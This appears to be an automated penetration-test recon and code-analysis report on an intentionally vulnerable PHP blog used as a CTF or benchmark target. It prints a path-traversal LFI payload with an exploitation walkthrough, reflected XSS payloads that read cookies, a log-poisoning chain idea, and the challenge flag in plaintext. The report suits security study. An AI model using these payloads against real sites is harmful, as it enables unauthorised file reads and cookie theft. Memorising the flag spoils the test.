# Pre-Reconnaissance Report

## Port Discovery (naabu)
Status: Skipped
[object Object]

## Network Scanning (nmap)
Status: success
Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-31 10:51 -0700
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000034s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 994 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
80/tcp    open  http       Caddy httpd
|_http-server-header: Caddy
|_http-title: Site doesn't have a title.
443/tcp   open  ssl/https
|_http-title: Site doesn't have a title.
631/tcp   open  ipp        CUPS 2.3
|_http-server-header: CUPS/2.3 IPP/2.1
|_http-title: Home - CUPS 2.3.4
8888/tcp  open  http       SimpleHTTPServer 0.6 (Python 3.12.10)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.12.10
| http-git: 
|   127.0.0.1:8888/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: \xE2\x9C\x85 Executive Summary and Report Cleanup: completed successf...
9999/tcp  open  tcpwrapped
49152/tcp open  http       Golang net/http server
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
|     Content-Type: text/plain; charset=utf-8
|     Tailscale-Cap: 115
|     Tailscale-Version: 1.82.5-tdec88625e-gec2eb9730
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Fri, 31 Oct 2025 17:51:09 GMT
|     Content-Length: 14
|     auth required
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port49152-TCP:V=7.97%I=7%D=10/31%Time=6904F70D%P=arm-apple-darwin24.4.0
SF:%r(FourOhFourRequest,192,"HTTP/1\.0\x20401\x20Unauthorized\r\nContent-S
SF:ecurity-Policy:\x20default-src\x20'none';\x20frame-ancestors\x20'none';
SF:\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20script-src-a
SF:ttr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nTails
SF:cale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-gec2eb973
SF:0\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r\n
SF:Date:\x20Fri,\x2031\x20Oct\x202025\x2017:51:09\x20GMT\r\nContent-Length
SF::\x2014\r\n\r\nauth\x20required\n")%r(GenericLines,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GetRequest,192,"H
SF:TTP/1\.0\x20401\x20Unauthorized\r\nContent-Security-Policy:\x20default-
SF:src\x20'none';\x20frame-ancestors\x20'none';\x20script-src\x20'none';\x
SF:20script-src-elem\x20'none';\x20script-src-attr\x20'none'\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nTailscale-Cap:\x20115\r\nTailsca
SF:le-Version:\x201\.82\.5-tdec88625e-gec2eb9730\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-Frame-Options:\x20DENY\r\nDate:\x20Fri,\x2031\x20Oct\
SF:x202025\x2017:51:09\x20GMT\r\nContent-Length:\x2014\r\n\r\nauth\x20requ
SF:ired\n")%r(HTTPOptions,192,"HTTP/1\.0\x20401\x20Unauthorized\r\nContent
SF:-Security-Policy:\x20default-src\x20'none';\x20frame-ancestors\x20'none
SF:';\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20script-src
SF:-attr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nTai
SF:lscale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-gec2eb9
SF:730\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r
SF:\nDate:\x20Fri,\x2031\x20Oct\x202025\x2017:51:09\x20GMT\r\nContent-Leng
SF:th:\x2014\r\n\r\nauth\x20required\n")%r(RTSPRequest,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.97 seconds


## Subdomain Discovery (subfinder)
Status: success
sbs.allsaintsschool.localhost
server02.counterintel.localhost
mse-ca-mail.corp.mse.localhost
mail02.regency.localhost
exchvm.nwcnet.localhost
autodiscover.regency.localhost
server2.hunter.localhost
mail.regency.localhost
naeu2.naeuinc.localhost
fndlync01.5ninesdata.localhost
mail.localhost
autodiscover.localhost
mail03.regency.localhost
www.localhost
tools.sonoma.edu.localhost
owa.regency.localhost


## Technology Detection (whatweb)
Status: success
[1m[34mhttp://localhost:34461[0m [200 OK] [1mApache[0m[[1m[32m2.4.54[0m], [1mBootstrap[0m, [1mHTML5[0m, [1mHTTPServer[0m[[1m[31mDebian Linux[0m][[1m[36mApache/2.4.54 (Debian)[0m], [1mIP[0m[[0m[22m::1[0m], [1mPHP[0m[[1m[32m7.4.33[0m], [1mScript[0m[[0m[22mtext/javascript[0m], [1mTitle[0m[[1m[33mEncoder64 Blog[0m], [1mX-Powered-By[0m[[0m[22mPHP/7.4.33[0m]

## Code Analysis
# Code Analysis Report: Encoder64 Blog (XBEN-079-24)

---

# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings adhere to this scope.

### In-Scope: Network-Reachable Components
Components considered **in-scope** include those whose execution can be initiated by network requests to the deployed application:
- Publicly exposed web pages and API endpoints (index.php, post.php, contact.php, about.php)
- Any endpoints requiring authentication (none exist in this application)
- Developer utilities mistakenly exposed through routes (none detected)
- Dynamically included content files (blog posts in posts/ directory)

### Out-of-Scope: Locally Executable Only
Components **out-of-scope** require execution contexts external to the application's request-response cycle:
- Build tools and Dockerfile build-time operations
- Docker Compose orchestration scripts
- Makefile build automation
- Benchmark test files (benchmark.json)
- Local development utilities

---

## 1. Executive Summary

The Encoder64 Blog is a **simple PHP 7.4-based blog application** deployed as a Docker container running Apache 2.4.54 on Debian 11. The application represents a **CTF challenge environment** with intentionally vulnerable code patterns. From a security perspective, this application exhibits **critical architectural security deficiencies** including complete absence of authentication mechanisms, minimal input validation, and a **critical Local File Inclusion (LFI) vulnerability** that serves as the primary attack vector.

The most significant finding is a **bypassable path traversal filter** in the blog post viewer (`post.php`) that allows arbitrary file inclusion, enabling attackers to read sensitive files including the CTF flag stored at `/FLAG.php`. Additionally, the application contains **multiple reflected Cross-Site Scripting (XSS) vulnerabilities** in the contact form where user input is echoed without sanitization. The data storage model uses file-based JSON storage with no database, and the application processes no authentication, making all endpoints publicly accessible.

The security posture is **severely inadequate for production deployment** but appropriately designed as a penetration testing target. The attack surface is well-defined with four primary HTTP endpoints, and the LFI vulnerability provides a direct path to flag extraction. No Server-Side Request Forgery (SSRF) attack vectors exist, and the application's simplicity limits complexity-based vulnerabilities while concentrating risk in the file inclusion mechanism. The deployment configuration exposes additional risks including world-writable Apache logs (chmod 0777) and flag storage in Docker image layers accessible via `docker history`.

---

## 2. Architecture & Technology Stack

### Framework & Language

The application is built on **PHP 7.4.33** (released November 24, 2022, **End-of-Life**) running on **Apache 2.4.54** web server. The choice of PHP 7.4 presents significant security implications as this version reached end-of-life on November 28, 2022, meaning no security patches are available for newly discovered vulnerabilities. The application uses **vanilla PHP** with no framework layer (no Laravel, Symfony, or CodeIgniter), eliminating framework-level security protections like CSRF middleware, ORM query builders, or input validation pipelines.

The Docker base image (`php:7.4-apache`) combines PHP-FPM with Apache in a single container, using Debian 11 (Bullseye) as the operating system layer. Apache is configured with `mod_rewrite` enabled (Dockerfile line 7) but no security modules like `mod_security` or `mod_evasive` are present. The PHP configuration uses critical settings that impact security: `allow_url_fopen = On` (enables URL wrappers for file functions) and `allow_url_include = Off` (prevents URL-based file inclusion, mitigating some SSRF risks but not preventing LFI).

No third-party dependencies are installed beyond the base image, confirmed by the absence of `composer.json` or vendor directories. All HTML rendering uses inline Bootstrap 4.5.2 CSS/JS loaded from CDN (jsdelivr.net), creating no additional attack surface from frontend dependencies. The absence of a framework means all security controls must be manually implemented in application code, which as analysis reveals, has been minimally done.

### Architectural Pattern

The application follows a **monolithic architecture** pattern with a single Docker service exposing all functionality. The structure is a traditional **Model-View-Controller (MVC) variant** without formal separation: PHP files combine routing, business logic, and HTML templating in single scripts. The deployment model uses **containerization** (Docker) with a single service defined in `docker-compose.yml`, exposing port 80 for HTTP traffic with no load balancing, service mesh, or microservices decomposition.

**Trust boundaries** are minimal due to lack of authentication: the only trust boundary exists at the **network perimeter** (container network vs. host network), as all application logic runs with identical privileges (www-data user). The application assumes **zero trust for all inputs** as there's no authenticated vs. unauthenticated user distinction. File system trust boundaries separate the web root (`/var/www/html/`) from system files, but the LFI vulnerability in `post.php` breaks this boundary by allowing traversal to `/FLAG.php` in the container root.

The data flow architecture is **unidirectional and stateless**: HTTP requests → PHP processing → File I/O (JSON reads, file includes) → HTML response. No session state persists between requests, and the contact form collects data that is immediately discarded without persistence. This stateless design eliminates session management vulnerabilities but also means no authorization context exists for resource access decisions. The application operates as a **publicly accessible content delivery system** with file inclusion serving as the dynamic content mechanism.

### Critical Security Components

**Authentication Libraries:** NONE. No authentication mechanisms exist - no login forms, no session management (`$_SESSION` never used), no JWT libraries, no OAuth clients. The entire application operates in an unauthenticated context, treating all requests as equally privileged.

**Authorization/RBAC:** NONE. No Role-Based Access Control, no permission checking middleware, no access control lists. The file inclusion logic in `post.php` (lines 6-11) represents the only gatekeeping mechanism, but this filter is critically flawed with a bypassable path traversal check using single-pass string replacement.

**Input Validation:** MINIMAL. Only two validation patterns exist:
1. **Type casting for pagination** (`/app/website/index.php` line 10): `$page = isset($_GET['page']) ? (int)$_GET['page'] : 1;` - This is effective as integer type casting prevents injection.
2. **Empty field validation** (`/app/website/contact.php` lines 9-27): Uses `empty(trim($_POST["field"]))` checks but no format validation (e.g., email regex), no length limits, and no sanitization before output.

**Encryption Libraries:** NONE. No password hashing (`password_hash()` never called), no symmetric encryption (`openssl_encrypt()` not used), no secure random generation. The flag is stored in plaintext in `/FLAG.php` and `.env` file.

**Security Middleware:** NONE. No CSRF token generation, no CORS headers configured, no rate limiting on any endpoint, no Content Security Policy (CSP), no X-Frame-Options header, no XSS protection headers. The Apache configuration in the Dockerfile sets ServerTokens to default (exposing version information) and does not configure security headers.

**Rate Limiting/WAF:** NONE. The contact form and LFI endpoint have no request throttling, allowing unlimited exploitation attempts. No Web Application Firewall rules, no fail2ban integration, no IP-based blocking.

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms

**Finding: NO AUTHENTICATION SYSTEM EXISTS**

This application has zero authentication infrastructure. Comprehensive analysis of all network-accessible PHP files confirmed the complete absence of:

- **Login/Logout Endpoints:** No login forms, authentication handlers, or session creation logic
- **Session Management:** No `session_start()` calls, no `$_SESSION` variable usage, no session cookies
- **Token-Based Authentication:** No JWT generation/validation, no API keys, no Bearer token handlers
- **Password Mechanisms:** No password fields, no `password_hash()` or `password_verify()` usage
- **OAuth/OIDC/SAML:** No third-party authentication integrations
- **Multi-Factor Authentication:** No 2FA/MFA implementations

The application treats all HTTP requests as equally privileged, operating in a completely **trustless external access model**. This design choice is appropriate for a CTF challenge but would be catastrophic for production applications handling sensitive data.

### Session Management

**Finding: NO SESSION MANAGEMENT IMPLEMENTED**

**Session Cookie Configuration:** NOT APPLICABLE - No sessions exist
- No `session_start()` initialization anywhere in codebase
- No session cookies created (no `setcookie()` calls for session IDs)
- **HttpOnly, Secure, SameSite flags:** NOT CONFIGURED - These flags would be set via `session_set_cookie_params()` which is never called
- No session timeout logic (no `session_gc_maxlifetime` configuration)
- No session invalidation/destruction logic

**Security Implications:** 
- **Positive:** No session fixation, session hijacking, or session CSRF risks
- **Negative:** No ability to track authenticated user state, no authorization context for resource access decisions
- **Context:** For a public blog application, lack of sessions is acceptable; for any authenticated functionality, this is a critical gap

### Authorization Model

**Finding: NO AUTHORIZATION CONTROLS**

**Access Control Analysis:**
- **Endpoint Protection:** All four HTTP endpoints (index.php, post.php, contact.php, about.php) are publicly accessible
- **RBAC Implementation:** None - no role definitions, no permission matrices
- **Resource Ownership:** No concept of ownership - all blog posts are public
- **Permission Checking:** The only "access control" is in `/app/website/post.php` lines 6-11:

```php
$post_id = $_GET['id'];
$posts_path = "posts/";
$post_id = str_replace(['../', './', '..\\', '.\\'], '', $post_id);
$file_to_include = $posts_path . $post_id;

if (file_exists($file_to_include)) {
    include($file_to_include);
}
```

This is **NOT authorization** but a critically flawed path sanitization attempt. The single-pass `str_replace()` can be bypassed with nested sequences like `....//....//FLAG.php` which becomes `../../FLAG.php` after filtering, enabling path traversal to `/FLAG.php`.

**Authorization Bypass Vectors:** 
- Direct file inclusion bypass via nested directory traversal sequences
- No whitelist validation against known-good post filenames
- File existence check (`file_exists()`) used as security control (insufficient - only validates file presence, not access permission)

### Multi-tenancy Security

**Finding: NOT APPLICABLE**

This is a single-tenant public blog application with no multi-tenancy features. No tenant isolation, no data segregation mechanisms, no cross-tenant access risks.

### SSO/OAuth/OIDC Flows

**Finding: NOT APPLICABLE**

No Single Sign-On, OAuth, or OpenID Connect implementations exist in this application. No callback endpoints, no state/nonce parameter validation, no PKCE implementation, no authorization code flows.

---

## 4. Data Security & Storage

### Database Security

**Finding: NO DATABASE SYSTEM**

The application uses **file-based JSON storage** instead of a database. The only data file is:

**`/app/website/posts.json`** (read by `index.php` line 3):
```json
{
  "posts": [
    {"title": "Script Kiddie", "post_url": "ScriptKiddie.php", ...},
    {"title": "EternalBlue", "post_url": "EternalBlue.php", ...},
    ...
  ]
}
```

**Security Analysis:**
- **No SQL injection risk** (no database queries)
- **File permissions:** Set to `www-data:www-data` ownership with 644 permissions (owner read/write, world readable) - appropriate for public content
- **Data integrity:** No checksums, no signature validation - JSON file can be modified if write access obtained
- **Access control:** Relies on filesystem permissions only

**Blog Post Content Storage:** Seven PHP files in `/app/website/posts/` directory containing blog post HTML content. These files are dynamically included via the vulnerable `post.php` endpoint, representing the primary attack surface for file inclusion exploitation.

### Data Flow Security

**Sensitive Data Paths:**

1. **CTF Flag Data Flow (CRITICAL):**
   - **Source:** `.env` file (line 1): `FLAG="flag{1939e32c-72e2-4691-8272-cbe431165ad0}"`
   - **Build Time:** Passed as Docker ARG (docker-compose.yml line 6, Dockerfile line 18)
   - **Deployment:** Written to `/FLAG.php` (Dockerfile line 19): `RUN echo "<?php $FLAG ?>" > /FLAG.php`
   - **Exposure Vector:** Readable via LFI vulnerability: `post.php?id=....//....//FLAG.php`
   - **Data Protection:** NONE - plaintext storage, no encryption, no access controls

2. **Contact Form Data Flow:**
   - **Input:** `$_POST['name']`, `$_POST['email']`, `$_POST['message']` (contact.php lines 9-26)
   - **Processing:** `trim()` only - no validation, no sanitization
   - **Storage:** Variables only (NOT persisted to disk or database)
   - **Transmission:** NOT sent externally (no email integration, no API calls)
   - **Output:** Echoed back to user WITHOUT `htmlspecialchars()` (lines 66, 71, 76) - **XSS vulnerability**
   - **Deletion:** Automatic on page unload
   - **Risk Level:** LOW (ephemeral data) but XSS risk exists

3. **Blog Post Metadata Flow:**
   - **Input:** `posts.json` (manually edited, no web interface)
   - **Processing:** `json_decode()` in index.php line 3
   - **Storage:** File-based JSON
   - **Output:** Rendered with proper `htmlspecialchars()` encoding (lines 48-52) - SECURE

**Data Protection Mechanisms:**
- **Encryption at Rest:** NONE - all data stored in plaintext
- **Encryption in Transit:** NONE - HTTP only (port 80), no HTTPS/TLS
- **Data Integrity:** No checksums, no digital signatures
- **Backup/Recovery:** No automated backup mechanisms

### Multi-tenant Data Isolation

**Finding: NOT APPLICABLE**

Single-tenant application with no tenant isolation requirements.

### Secrets Management

**Critical Finding: INSECURE SECRETS HANDLING**

**Flag Storage Locations:**
1. **`.env` file** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/.env` line 1)
   - Plaintext: `FLAG="flag{1939e32c-72e2-4691-8272-cbe431165ad0}"`
   - **Risk:** May be committed to version control (should be .gitignored)

2. **Docker Image Layers** (Dockerfile line 18)
   - Build ARG values persist in image metadata
   - Extractable via: `docker history <image_id>`
   - **CRITICAL:** Flag visible in build command: `RUN echo "<?php $FLAG ?>"`

3. **Container Filesystem** (`/FLAG.php`)
   - World-readable PHP file in container root
   - Accessible via LFI: `post.php?id=....//....//FLAG.php`

**Secrets Management Assessment:**
- **Secret Distribution:** Build-time ARG (INSECURE - persists in layers)
- **Secret Rotation:** None (static flag value)
- **Access Controls:** None (file is world-readable)
- **Encryption:** None (plaintext storage)
- **Secret Expiration:** None (no TTL)

**Recommendations:**
- Use Docker secrets (`docker secret create`) instead of build ARGs
- Mount secrets at runtime, not build time
- Use multi-stage builds to exclude secrets from final image
- Implement file-level access controls for sensitive files

---

## 5. Attack Surface Analysis

### External Entry Points

The application exposes **four primary HTTP endpoints** on port 80, all network-accessible without authentication:

#### 1. **Blog Listing Page** - `/index.php` (or `/`)
- **Method:** GET
- **Parameters:** `page` (pagination, optional)
- **Handler:** `/app/website/index.php`
- **Functionality:** Displays paginated list of blog posts from `posts.json`
- **Input Validation:** `$page = isset($_GET['page']) ? (int)$_GET['page'] : 1;` (line 10) - **SECURE** (type-cast to integer)
- **Output Encoding:** Proper use of `htmlspecialchars()` on lines 48, 50-52 - **SECURE**
- **Attack Surface:** MINIMAL - pagination parameter is properly sanitized
- **Risk Level:** LOW

#### 2. **Blog Post Viewer** - `/post.php` ⚠️ **CRITICAL VULNERABILITY**
- **Method:** GET
- **Parameters:** `id` (post filename, required)
- **Handler:** `/app/website/post.php`
- **Functionality:** Dynamically includes PHP files from `posts/` directory
- **Input Validation:** BYPASSABLE path traversal filter (line 7):
  ```php
  $post_id = str_replace(['../', './', '..\\', '.\\'], '', $post_id);
  ```
  **Bypass Methods:**
  - Nested sequences: `....//` → `../` after single-pass replacement
  - Double encoding: `%252e%252e%252f` (if URL decoding applied twice)
  - Mixed case: `..%2F` (if case-sensitive filtering)
  
- **Vulnerability:** Local File Inclusion (LFI)
  - **File:** `/app/website/post.php` line 11: `include($file_to_include);`
  - **Exploit:** `GET /post.php?id=....//....//FLAG.php`
  - **Impact:** Arbitrary file read, potential remote code execution if attacker can write files (e.g., via log poisoning)
  
- **Attack Surface:** **PRIMARY ATTACK VECTOR**
- **Risk Level:** CRITICAL (CVSS 3.1: 7.5 HIGH)

**Legitimate Usage Examples:**
- `GET /post.php?id=ScriptKiddie.php` → Includes `/app/website/posts/ScriptKiddie.php`
- `GET /post.php?id=EternalBlue.php` → Includes `/app/website/posts/EternalBlue.php`

**Exploitation Path:**
```
GET /post.php?id=....//....//FLAG.php
  ↓
str_replace() filter processes: "....//....//FLAG.php"
  ↓
After replacement: "../../FLAG.php"
  ↓
Concatenated path: "posts/../../FLAG.php" = "/FLAG.php"
  ↓
include("/FLAG.php") executes
  ↓
Flag contents rendered: "<?php flag{1939e32c-72e2-4691-8272-cbe431165ad0} ?>"
```

#### 3. **Contact Form** - `/contact.php` ⚠️ **XSS VULNERABILITIES**
- **Methods:** GET (display form), POST (submit form)
- **Parameters:** `name`, `email`, `message` (all POST)
- **Handler:** `/app/website/contact.php`
- **Functionality:** Displays contact form, validates input, shows success/error messages (NO actual sending/storage)
- **Input Validation:** Minimal - `empty(trim($_POST["field"]))` only (lines 9-27)
  - No email format validation (relies on HTML5 client-side only)
  - No length limits
  - No XSS sanitization
  
- **Vulnerabilities:** Reflected XSS (3 instances)
  1. **Name field XSS** (line 66): `<input value="<?php echo $name; ?>">`
  2. **Email field XSS** (line 71): `<input value="<?php echo $email; ?>">`
  3. **Message field XSS** (line 76): `<textarea><?php echo $message; ?></textarea>`
  
  **Exploit Payloads:**
  - Name: `"><script>alert(document.cookie)</script><input value="`
  - Email: `test@test.com" onfocus="alert(1)" autofocus="`
  - Message: `</textarea><script>alert(document.cookie)</script><textarea>`

- **Attack Surface:** HIGH - Multiple XSS vectors, no CSRF protection
- **Risk Level:** HIGH (but practical impact LOW due to no authentication/sessions)

**Data Handling:** Contact form data is **NOT persisted** - no email sending, no database storage, data discarded after display. This creates a deceptive user experience (form says "we will get back to you" but doesn't actually process data).

#### 4. **About Page** - `/about.php`
- **Method:** GET
- **Parameters:** None
- **Handler:** `/app/website/about.php`
- **Functionality:** Static HTML content about the blog
- **Input Validation:** N/A (no user input)
- **Attack Surface:** NONE
- **Risk Level:** NONE

### Internal Service Communication

**Finding: NO INTERNAL SERVICES**

This is a single-service monolithic application with no microservices architecture, no internal APIs, no service-to-service communication. The only "communication" is:
- PHP process → Filesystem (reading JSON, including PHP files)
- PHP process → Apache (request/response handling)

**Trust Boundaries:**
- **Container Network Boundary:** Between Docker container and host network (port 80 exposed)
- **Filesystem Boundary:** Between web root (`/var/www/html/`) and system files (BROKEN by LFI vulnerability)
- **Process Boundary:** All code runs as `www-data` user with identical privileges

### Input Validation Patterns

**Comprehensive Input Handling Analysis:**

1. **Pagination Parameter** (`index.php` line 10):
   ```php
   $page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
   ```
   - **Method:** Type casting to integer
   - **Effectiveness:** HIGH - prevents injection, limits to numeric values
   - **Gap:** No bounds checking (can request page 99999)

2. **Post ID Parameter** (`post.php` lines 4-7):
   ```php
   $post_id = $_GET['id'];
   $post_id = str_replace(['../', './', '..\\', '.\\'], '', $post_id);
   ```
   - **Method:** Blacklist-based string replacement (single-pass)
   - **Effectiveness:** LOW - bypassable with nested sequences
   - **Gap:** No whitelist validation, no file extension check, no basename() usage

3. **Contact Form Fields** (`contact.php` lines 9-27):
   ```php
   if(empty(trim($_POST["name"]))) { $name_err = "Please enter your name."; }
   else { $name = trim($_POST["name"]); }
   ```
   - **Method:** Empty field check only
   - **Effectiveness:** MINIMAL - only validates presence, not format
   - **Gap:** No length limits, no character whitelist, no XSS sanitization, no email format validation

4. **Server Variable Usage** (`contact.php` line 63):
   ```php
   <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
   ```
   - **Method:** `htmlspecialchars()` encoding
   - **Effectiveness:** HIGH - prevents XSS in form action
   - **Note:** Proper defensive coding pattern

**Input Validation Architecture:**
- **No centralized validation library** - each script implements ad-hoc validation
- **No framework validation layer** (no Laravel Request validation, no Symfony Forms)
- **No input sanitization** before output (except in index.php)
- **Mixed validation quality** - some endpoints secure (index.php), others critically flawed (post.php)

### Background Processing

**Finding: NO BACKGROUND JOBS**

No asynchronous job processing, no cron jobs, no message queues, no worker processes. All processing is synchronous within HTTP request/response cycle.

### API Schema Files

**Schema File Identified:**
- **`/app/website/posts.json`** - Blog post metadata schema
- **Location:** Copied to `outputs/schemas/blog_posts_schema.json`
- **Format:** JSON array of post objects
- **Fields:** `title`, `post_url`, `tags`, `upload_date`, `image_url`, `content` (excerpt)
- **Access:** Readable via `file_get_contents()` in `index.php` line 3
- **Direct Web Access:** Potentially accessible at `/posts.json` if directory listing enabled or direct file access configured

**No API schemas found** (no OpenAPI/Swagger, no GraphQL, no Protobuf, no WSDL)

---

## 6. Infrastructure & Operational Security

### Secrets Management

**Finding: INSECURE SECRETS HANDLING**

**Secret Storage Methods:**
1. **Environment Variables** (`.env` file):
   - File: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/.env`
   - Content: `FLAG="flag{1939e32c-72e2-4691-8272-cbe431165ad0}"`
   - **Risk:** Plaintext file in project directory, may be version-controlled

2. **Docker Build Arguments** (Dockerfile line 18):
   - `ARG FLAG` - Passed from docker-compose build context
   - **CRITICAL ISSUE:** ARG values persist in Docker image metadata
   - **Extractable via:** `docker history <image_id>` reveals build commands

3. **Filesystem Storage** (`/FLAG.php`):
   - Created at build time (Dockerfile line 19): `RUN echo "<?php $FLAG ?>" > /FLAG.php`
   - **Risk:** World-readable file accessible via LFI vulnerability

**Secret Rotation:** NONE - Flag value is static with no rotation mechanism

**Recommended Improvements:**
- Use Docker Secrets (`docker secret create flag /path/to/flag.txt`)
- Mount secrets at runtime using: `secrets: - flag`
- Never use ARG for sensitive data (use ENV only, and only at runtime)
- Implement file-level access controls: `chmod 600 /FLAG.php`

### Configuration Security

**Environment Separation:**
- **Single Environment:** No dev/staging/prod separation detected
- **Configuration Files:** Dockerfile, docker-compose.yml, .env (no environment-specific configs)

**Secret Handling in Configs:**
- **docker-compose.yml** (line 6): `- FLAG` (reads from .env)
- **Dockerfile** (line 18-19): Exposes flag in image layers
- **.env** (line 1): Plaintext flag storage

**PHP Configuration Security (from Dockerfile):**
- **Error Reporting:** Disabled globally in `post.php` (line 2): `error_reporting(0);`
  - **Impact:** Prevents information disclosure but hinders debugging
- **allow_url_fopen:** On (enables URL wrappers in file functions)
- **allow_url_include:** Off (prevents URL-based file inclusion - mitigates some SSRF)
- **open_basedir:** Not configured (no filesystem restriction)
- **disable_functions:** Not configured (all functions available including exec, system)

**Security Headers Configuration:**

**Finding: NO SECURITY HEADERS CONFIGURED**

**Apache Configuration Locations Analyzed:**
- Dockerfile (lines 1-21): No security header configuration
- No `.htaccess` files found
- No `apache2.conf` modifications
- No PHP `header()` calls in application code

**Specific Infrastructure-Level Header Search:**

**HSTS (Strict-Transport-Security):**
- **Search Location:** Nginx/Apache configs, CDN settings, Kubernetes Ingress
- **Finding:** NOT CONFIGURED
- **Impact:** No HTTPS enforcement (application runs HTTP-only on port 80)
- **File:** Dockerfile line 21: `EXPOSE 80` (HTTP only, no HTTPS/443)

**Cache-Control:**
- **Search Location:** Apache configuration, PHP headers, reverse proxy configs
- **Finding:** NOT EXPLICITLY SET
- **Default Behavior:** Apache applies default caching based on file types
- **Impact:** No cache prevention for sensitive endpoints, potential credential caching

**Missing Security Headers:**
- `Content-Security-Policy` - NOT SET (XSS risk)
- `X-Frame-Options` - NOT SET (clickjacking risk)
- `X-Content-Type-Options` - NOT SET (MIME sniffing attacks possible)
- `X-XSS-Protection` - NOT SET (legacy but recommended)
- `Referrer-Policy` - NOT SET (information leakage via Referer header)

**Recommendation:** Add security headers in Apache configuration:
```apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set Content-Security-Policy "default-src 'self'; script-src 'self' cdn.jsdelivr.net"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Cache-Control "no-store, no-cache, must-revalidate, proxy-revalidate"
```

### External Dependencies

**Third-Party Services:**
- **CDN:** Bootstrap 4.5.2 CSS/JS loaded from `cdn.jsdelivr.net`
  - **Security Implication:** Trusted third-party CDN, SRI (Subresource Integrity) not implemented
  - **Recommendation:** Add SRI hashes to `<link>` and `<script>` tags

**No External APIs:** No payment gateways, no OAuth providers, no analytics services, no external data sources

**Docker Base Image:**
- `php:7.4-apache` (official PHP Docker image)
- **Security Concern:** PHP 7.4 is End-of-Life (November 2022) - no security updates
- **Recommendation:** Upgrade to `php:8.2-apache` or `php:8.3-apache`

### Monitoring & Logging

**Logging Configuration:**

**Apache Access Logs:**
- **Location:** `/var/log/apache2/access.log`
- **Permissions:** **0777 (world-writable)** - Configured in Dockerfile line 16:
  ```dockerfile
  RUN rm /var/log/apache2/access.log && \
      touch /var/log/apache2/access.log && \
      chown www-data:www-data /var/log/apache2/access.log && \
      chmod 0777 /var/log/apache2/access.log
  ```
- **CRITICAL SECURITY ISSUE:** World-writable logs enable:
  - Log injection attacks
  - Log tampering/evidence destruction
  - Potential log poisoning → LFI chain (include access.log after injecting PHP code in User-Agent)

**Apache Error Logs:**
- **Location:** `/var/log/apache2/error.log`
- **Permissions:** Default (likely 644)
- **PHP Error Reporting:** DISABLED in post.php (line 2): `error_reporting(0);`

**Application Logging:**
- **Finding:** NO APPLICATION-LEVEL LOGGING
- No logging framework (no Monolog, no custom logger)
- No security event logging (no authentication attempts, no suspicious activity tracking)
- No audit trails

**Monitoring:**
- **Health Checks:** Docker Compose health check configured (docker-compose.yml lines 9-13):
  ```yaml
  healthcheck:
    test: ["CMD", "curl", "-f", "http://127.0.0.1:80/"]
    interval: 10s
    timeout: 1s
    retries: 5
  ```
- **Security Monitoring:** NONE (no IDS/IPS, no SIEM integration, no anomaly detection)

**Recommendations:**
1. Fix log file permissions: `chmod 644 /var/log/apache2/access.log`
2. Implement application-level security event logging
3. Enable error logging to file (not suppression): `error_reporting(E_ALL); error_log(...)`
4. Implement log rotation (logrotate)
5. Consider centralized logging (ELK stack, Splunk, CloudWatch)

---

## 7. Overall Codebase Indexing

The Encoder64 Blog codebase follows a **flat, simplistic directory structure** characteristic of small PHP applications predating modern framework conventions. The project root (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/`) contains deployment orchestration files (Dockerfile, docker-compose.yml, Makefile) alongside application code, with no separation of infrastructure and application concerns. This colocation simplifies CTF deployment but violates production best practices for separation of concerns.

